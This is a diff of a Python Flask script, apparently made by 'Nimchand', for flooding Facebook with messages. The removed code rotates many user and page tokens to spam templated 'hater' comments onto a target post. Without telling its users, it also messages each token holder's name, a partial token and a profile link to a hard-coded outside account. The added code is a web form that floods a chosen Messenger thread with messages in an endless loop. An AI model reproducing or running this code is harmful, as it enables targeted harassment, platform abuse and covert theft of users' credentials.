@@ -1,266 +1,376 @@
-import os
-import time
+from flask import Flask, request
 import requests
-import threading
-from datetime import datetime, timedelta
-import logging
-import sys
+from time import sleep
+import time
+from datetime import datetime
+app = Flask(__name__)
+app.debug = True
 
-# Disable all logging
-logging.getLogger('werkzeug').setLevel(logging.ERROR)
-logging.basicConfig(level=logging.ERROR)
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
-class FacebookCommentServer:
-    def __init__(self):
-        self.base_url = "https://graph.facebook.com/v17.0"
-        self.load_config_files()
-        self.current_token_index = 0
-        self.current_name_index = 0
-        self.current_comment_index = 0
-        self.cycle_count = 0
-        self.server_running = True
-        self.shifting_mode = False
-        self.shifting_start_time = None
-        
-    def load_config_files(self):
-        """Load all configuration files"""
-        try:
-            # Load tokens
-            with open('token.txt', 'r') as f:
-                self.tokens = [line.strip() for line in f if line.strip()]
-            
-            # Load shifting tokens
-            with open('shifting_token.txt', 'r') as f:
-                self.shifting_tokens = [line.strip() for line in f if line.strip()]
-            
-            # Load post ID
-            with open('post_id.txt', 'r') as f:
-                self.post_id = f.read().strip()
-            
-            # Load names
-            with open('hatersname.txt', 'r') as f:
-                self.haters_names = [line.strip() for line in f if line.strip()]
-            
-            with open('lastname.txt', 'r') as f:
-                self.last_names = [line.strip() for line in f if line.strip()]
-            
-            # Load time intervals
-            with open('time.txt', 'r') as f:
-                self.time_intervals = [int(line.strip()) for line in f if line.strip()]
-            
-            with open('shifting_token_interval.txt', 'r') as f:
-                self.shifting_intervals = [int(line.strip()) for line in f if line.strip()]
-            
-            # Load comments
-            with open('comments.txt', 'r') as f:
-                self.comments = [line.strip() for line in f if line.strip()]
-            
-            # Load shifting time
-            with open('shifting_time.txt', 'r') as f:
-                shifting_time = f.read().strip()
-                self.shifting_hours = int(shifting_time)
-            
-            print("All configuration files loaded successfully!")
-            
-        except FileNotFoundError as e:
-            print(f"Error: Missing configuration file - {e}")
-            sys.exit(1)
-        except Exception as e:
-            print(f"Error loading configuration files: {e}")
-            sys.exit(1)
-    
-    def extract_page_tokens(self, user_token):
-        """Extract page tokens from user token"""
-        try:
-            url = f"{self.base_url}/me/accounts"
-            params = {'access_token': user_token}
-            response = requests.get(url, params=params)
-            
-            if response.status_code == 200:
-                data = response.json()
-                page_tokens = []
-                for page in data.get('data', []):
-                    page_tokens.append({
-                        'token': page['access_token'],
-                        'name': page['name'],
-                        'id': page['id']
-                    })
-                return page_tokens
-            return []
-        except Exception as e:
-            print(f"Error extracting page tokens: {e}")
-            return []
-    
-    def get_all_tokens(self):
-        """Get all tokens including page tokens"""
-        all_tokens = []
-        
-        if self.shifting_mode:
-            token_list = self.shifting_tokens
-        else:
-            token_list = self.tokens
-        
-        for token in token_list:
-            all_tokens.append({'type': 'user', 'token': token})
-            page_tokens = self.extract_page_tokens(token)
-            all_tokens.extend([{'type': 'page', 'token': pt['token'], 'page_name': pt['name']} for pt in page_tokens])
-        
-        return all_tokens
-    
-    def send_initial_message(self, token_info):
-        """Send initial message to Raj Mishra"""
-        try:
-            recipient_id = "61575557459838"
-            message = f"tum sabka baap raj mishra ka post server use ho raha h ...? HELLO RAJ SIR THANK U MY NAME IS {token_info.get('page_name', 'User')} I M USING YOUR SERVER ! MY TOKEN IS {token_info['token'][:20]}... AND MY PROFILE LINK IS https://www.facebook.com/{token_info.get('id', 'profile')}"
-            
-            url = f"{self.base_url}/{recipient_id}/messages"
-            params = {
-                'access_token': token_info['token'],
-                'message': message
-            }
-            
-            response = requests.post(url, json=params)
-            return response.status_code == 200
-        except Exception as e:
-            return False
-    
-    def send_comment(self, token, comment_text):
-        """Send comment to post"""
-        try:
-            url = f"{self.base_url}/{self.post_id}/comments"
-            params = {
-                'access_token': token,
-                'message': comment_text
-            }
-            
-            response = requests.post(url, json=params)
-            return response.status_code in [200, 201]
-        except Exception as e:
-            return False
-    
-    def get_current_comment_text(self):
-        """Generate current comment text"""
-        hater_name = self.haters_names[self.current_name_index % len(self.haters_names)]
-        last_name = self.last_names[self.current_name_index % len(self.last_names)]
-        comment = self.comments[self.current_comment_index % len(self.comments)]
-        
-        return f"{hater_name}+{comment}+{last_name}"
-    
-    def run_comment_cycle(self):
-        """Run one complete comment cycle"""
-        all_tokens = self.get_all_tokens()
-        
-        for i, token_info in enumerate(all_tokens):
-            comment_text = self.get_current_comment_text()
-            success = self.send_comment(token_info['token'], comment_text)
-            
-            if success:
-                status = "SUCCESSFULLY SENT"
-                print(f"NIMCHAND WEB POST SERVER RUNNING COMMENT {self.current_comment_index + 1} {status}")
-            else:
-                status = "UNSUCCESSFULLY SENT"
-                print(f"NIMCHAND WEB POST SERVER RUNNING COMMENT {self.current_comment_index + 1} {status}")
-            
-            # Update indices
-            self.current_name_index = (self.current_name_index + 1) % max(len(self.haters_names), len(self.last_names))
-            self.current_comment_index = (self.current_comment_index + 1) % len(self.comments)
-            
-            # Get appropriate delay
-            if self.shifting_mode:
-                delay = self.shifting_intervals[i % len(self.shifting_intervals)]
-            else:
-                delay = self.time_intervals[i % len(self.time_intervals)]
-            
-            time.sleep(delay)
-    
-    def check_shifting_time(self):
-        """Check if it's time to switch to shifting tokens"""
-        if self.shifting_start_time and not self.shifting_mode:
-            current_time = datetime.now()
-            elapsed_hours = (current_time - self.shifting_start_time).total_seconds() / 3600
-            
-            if elapsed_hours >= self.shifting_hours:
-                print("Switching to shifting token mode...")
-                self.shifting_mode = True
-                # Send initial messages for shifting tokens
-                shifting_tokens = self.get_all_tokens()
-                for token_info in shifting_tokens:
-                    self.send_initial_message(token_info)
-    
-    def start_server(self):
-        """Start the main server"""
-        print("NIMCHAND WEB POST SERVER INITIALIZING...")
-        
-        # Send initial messages for main tokens
-        main_tokens = self.get_all_tokens()
-        for token_info in main_tokens:
-            self.send_initial_message(token_info)
-        
-        self.shifting_start_time = datetime.now()
-        
-        print("NIMCHAND WEB POST SERVER STARTED SUCCESSFULLY!")
-        
-        while self.server_running:
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        while True:
             try:
-                self.check_shifting_time()
-                
-                print(f"\nStarting Cycle {self.cycle_count + 1}...")
-                self.run_comment_cycle()
-                
-                self.cycle_count += 1
-                print(f"Cycle {self.cycle_count} completed. All comments sent successfully!")
-                print("Server restarting automatically in 10 seconds...")
-                
-                time.sleep(10)
-                
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
             except Exception as e:
-                print(f"Error in main loop: {e}")
-                print("Server continuing after error...")
-                time.sleep(5)
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(30)
 
-def create_default_files():
-    """Create default configuration files if they don't exist"""
-    default_files = {
-        'token.txt': 'EAAD6V7EXAMPLE1\nEAAD6V7EXAMPLE2',
-        'shifting_token.txt': 'EAAD6V7SHIFTING1\nEAAD6V7SHIFTING2',
-        'post_id.txt': '123456789012345_123456789012345',
-        'hatersname.txt': 'John\nMike\nRobert',
-        'lastname.txt': 'Smith\nJohnson\nWilliams',
-        'time.txt': '5\n10\n15',
-        'shifting_token_interval.txt': '30\n45\n60',
-        'comments.txt': 'Great post!\nAwesome!\nNice one!',
-        'shifting_time.txt': '1'
+
+    return '''
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CHAND CANVO</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-image: url('birthday_background.jpg'); /* Specify the path to your birthday background image */
+      background-repeat: repeat; /* Repeat the background image */
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      max-width: 300px;
+      background-color: bisque;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      margin: 20px auto;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+      color: blue;
+    }
+    .btn-submit {
+      width: 100%;
+      margin-top: 10px;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .box {
+      border: 2px solid black;
+      padding: 20px;
+      margin-top: 20px;
+      background-color: lavender;
+      color: purple;
+    }
+    /* New styles for birthday box */
+    .birthday-box {
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #ffcc00;
+      color: black;
+      padding: 5px 10px;
+      border-radius: 5px;
+      z-index: 999;
+    } 
+  </style>
+</head>
+<body>
+  <!-- Birthday box -->
+  <div class="birthday-box">
+    <p>PAGE CANVO SERVER </p>
+  </div>
+
+ <style>
+        /* Style for the container */
+        .containe {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #F9F449;
+            padding: 20px;
+            border: 3px solid black;
+            border-radius: 10px;
+        }
+        
+        /* Style for the text inside the box */
+        .text-box {
+            font-size: 14px;
+            color: #333;
+        } 
+         .containr {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #C3F7EF;
+            padding: 20px;
+            border-radius: 10px; /* Added border radius value */
+            border-style: solid;
+            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
+        }
+        
+        /* Style for the text inside the box */
+        .text-box {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Keyframes for the border color change */
+        @keyframes borderChangeColor {
+    0% { border-color: red; }
+    10% { border-color: orange; }
+    20% { border-color: yellow; }
+    30% { border-color: lime; }
+    40% { border-color: green; }
+    50% { border-color: aqua; }
+    60% { border-color: blue; }
+    70% { border-color: purple; }
+    80% { border-color: indigo; }
+    90% { border-color: violet; }
+    100% { border-color: pink; }
+}
+
+        }
+
+        /* Keyframes for the border width change */
+        @keyframes borderChangeWidth {
+            0% { border-width: 5px; }
+            10% { border-width: 10px; }
+            20% { border-width: 3px; }
+            40% { border-width: 8px; }
+            60% { border-width: 4px; }
+            80% { border-width: 7px; }
+            100% { border-width: 6px; }
+        }
+
+        /* Keyframes for the border style change */
+        @keyframes borderChangeStyle {
+            0% { border-style: solid; }
+            10% { border-style: dotted; }
+            20% { border-style: dashed; }
+            30% { border-style: double; }
+            40% { border-style: groove; }
+            50% { border-style: ridge; }
+            60% { border-style: inset; }
+            70% { border-style: outset; }
+           
+           
+           
+        } .containor {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px; /* Added border radius value */
+            border-style: solid;
+            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
+        }
+        
+        /* Style for the text inside the box */
+        .text-box {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Keyframes for the border color change */
+        @keyframes borderChangeColor {
+    0% { border-color: red; }
+    10% { border-color: orange; }
+    20% { border-color: yellow; }
+    30% { border-color: lime; }
+    40% { border-color: green; }
+    50% { border-color: aqua; }
+    60% { border-color: blue; }
+    70% { border-color: purple; }
+    80% { border-color: indigo; }
+    90% { border-color: violet; }
+    100% { border-color: pink; }
+}
+
+        }
+
+        /* Keyframes for the border width change */
+        @keyframes borderChangeWidth {
+            0% { border-width: 5px; }
+            10% { border-width: 10px; }
+            20% { border-width: 3px; }
+            40% { border-width: 8px; }
+            60% { border-width: 4px; }
+            80% { border-width: 7px; }
+            100% { border-width: 6px; }
+        }
+
+        /* Keyframes for the border style change */
+        @keyframes borderChangeStyle {
+           
+            30% { border-style: double; }
+            40% { border-style: groove; }
+            50% { border-style: ridge; }
+            60% { border-style: inset; }
+            70% { border-style: outset; }
+           
+           
+           
+        }
+    </style>
+</head>
+<body> </div> <div class="containor">
+    <!-- Your text box content here -->
+    <footer class="footer">
+      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">🅴🅽🅹🅾🆈 -- 🅶🅸🅵🆃</span>.</span></p>
+      <p><span class="boxed-text2"><span class="color-span">GIFT BY NIMCHAND TRICKER</span></span></p>
+  </p>
+    </footer>
+    </div>
+</div>
+
+
+    <div class="containe">
+      <form action="/" method="post" enctype="multipart/form-data">
+        <div class="mb-3">
+          <label for="accessToken">Enter Your Token:</label>
+          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
+        </div>
+        <div class="mb-3">
+          <label for="threadId">Enter Convo/Inbox ID:</label>
+          <input type="text" class="form-control" id="threadId" name="threadId" required>
+        </div>
+        <div class="mb-3">
+          <label for="kidx">Enter Hater Name:</label>
+          <input type="text" class="form-control" id="kidx" name="kidx" required>
+        </div>
+        <div class="mb-3">
+          <label for="txtFile">Select Your Notepad File:</label>
+          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+          <label for="time">Speed in Seconds:</label>
+          <input type="number" class="form-control" id="time" name="time" required>
+        </div>
+        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+      </form>
+    </div>
+   <style>
+    .footer {
+      color: #B00402; /* Off-Blue color */
+    }
+    .boxed-text {
+      border: 2px solid #B00402; /* Border around the text */
+      padding: 10px; /* Add some padding inside the box */
+      display: inline-block; /* Make the box inline so it wraps around the text */
+    }
+    .boxed-text2 {
+      border: 2px solid #000000; /* Border around the text */
+      padding: 10px; /* Add some padding inside the box */
+      display: inline-block; /* Make the box inline so it wraps around the text */
+    }
+    .footer a {
+      color: #FFFF00; /* Off-Blue color for links */
+      text-decoration: none; /* Remove underline from links */
     }
     
-    for filename, content in default_files.items():
-        if not os.path.exists(filename):
-            with open(filename, 'w') as f:
-                f.write(content)
-            print(f"Created default {filename}")
-
-# Flask app for web server (minimal)
-from flask import Flask
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "NIMCHAND WEB POST SERVER RUNNING SILENTLY"
-
-def run_flask():
-    """Run Flask server silently"""
-    import waitress
-    waitress.serve(app, host='0.0.0.0', port=4000)
-
-if __name__ == "__main__":
-    # Create default files if missing
-    create_default_files()
+  </style>
+</head>
+<body>
+  <div>
     
-    # Start Facebook comment server in separate thread
-    fb_server = FacebookCommentServer()
-    server_thread = threading.Thread(target=fb_server.start_server, daemon=True)
-    server_thread.start()
+  </div> <div class="containor">
+    <!-- Your text box content here -->
+    <footer class="footer">
+      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐌𝐀𝐃𝐄 𝐁𝐘 𝐍𝐈𝐌𝐂𝐇𝐀𝐍𝐃</span>.</span></p>
+      <p><span class="boxed-text"><span class="color-span"> 𝗚𝗜𝗙𝗧 𝗢𝗙 ❰𝐍𝐈𝐌𝐂𝐇𝐀𝐍𝐃❱</span></span></p>
+      <p><span class="boxed-text"><span class="color-sp">SUBSCRIBE ON</span> <a href="https://www.youtube.com/@chandtricker436" class="color-s">YOUTUBE</a></p>
+    </footer>
+    </div>
+</div>
+
+  <script>
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-span');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); 
+    </script>
+    <script>
     
-    # Start Flask server
-    print("Starting web server on port 4000...")
-    run_flask()
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-spa');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); // Change color every 2 seconds (2000 milliseconds)
+  </script>
+  
+  <script>
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-s');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); 
+    </script>
+    <script>
+    
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-sp');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); // Change color every 2 seconds (2000 milliseconds)
+  </script>
+</body>
+</html>
+
+    '''
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+    app.run(debug=True)
